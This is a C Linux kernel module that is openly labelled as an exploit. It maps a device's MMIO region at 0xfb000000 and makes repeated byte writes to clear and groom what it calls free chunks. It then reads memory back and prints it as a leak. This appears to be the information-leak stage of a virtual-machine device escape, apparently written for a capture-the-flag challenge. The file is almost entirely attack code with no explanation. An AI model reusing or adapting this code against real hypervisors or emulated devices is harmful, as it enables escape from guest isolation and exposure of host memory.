#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/ioport.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/io.h>
#include <asm/io.h>

#include <linux/module.h>
#include <linux/pci.h>
#include <linux/printk.h>

#define virt_to_phys(a) ((unsigned long)__pa(a))
#define phys_to_virt(a) __va(a)

#define IO_MEM_BASE 0xfb000000
#define IO_MEM_END 0xfbffffff

void hexdump(void *ptr, size_t size)
{
    size_t i;
    for (i = 0; i < size; i++)
    {
        if (i % 16 == 0)
            printk("\n0x%016x:", ptr + i);
        if (i % 4 == 0)
            printk(" ");
        printk("%02x", *(uint8_t *)(ptr + i));
    }
    printk("\n");
}

static inline void readsb(const volatile void __iomem *addr, void *buffer,
			  unsigned int count)
{
	if (count) {
		u8 *buf = buffer;

		do {
			u8 x = __raw_readb(addr++);
			*buf++ = x;
		} while (--count);
	}
}

static inline void writesb(volatile void __iomem *addr, const void *buffer,
			   unsigned int count)
{
	if (count) {
		const u8 *buf = buffer;

		do {
			__raw_writeb(*buf++, addr++);
		} while (--count);
	}
}

static int __init exp_init(void) {
    int i;
    printk("exploit init\n");

    void __iomem *mmio = ioremap(IO_MEM_BASE, IO_MEM_END - IO_MEM_BASE + 1);
    printk("mmio %lx", mmio);
    int idx = 0;
    void __iomem *addr = mmio + (idx << 16);

    // clear all free chunks
    for (i = 0;i < 0x300;i ++) {
        writeb(100, addr + (0 << 20));
    }

    for (i = 0;i < 10; i++) {
        writeb(100, mmio + (i << 16) + (0 << 20));
    }

    //char *fillup = "aaaabbbbccccdddd";

    //writesb(addr + (2 << 20), fillup, 16);
    //for (i = 0;i < 5; i++) {
    //    writeb(100, mmio + (0 << 16) + (1 << 20));
    //}
    writeb(100, mmio + (0 << 16) + (1 << 20));

    char *readout = (char*) kzalloc(0x300, GFP_KERNEL);
    readsb(addr, readout, 0x20);

    printk("leak: %s\n", readout);
    hexdump(readout, 0x20);
    return 0;
}

static void __exit exp_exit(void) {
    printk("exploit exit\n");
}

module_init(exp_init);
module_exit(exp_exit);
MODULE_LICENSE("GPL");
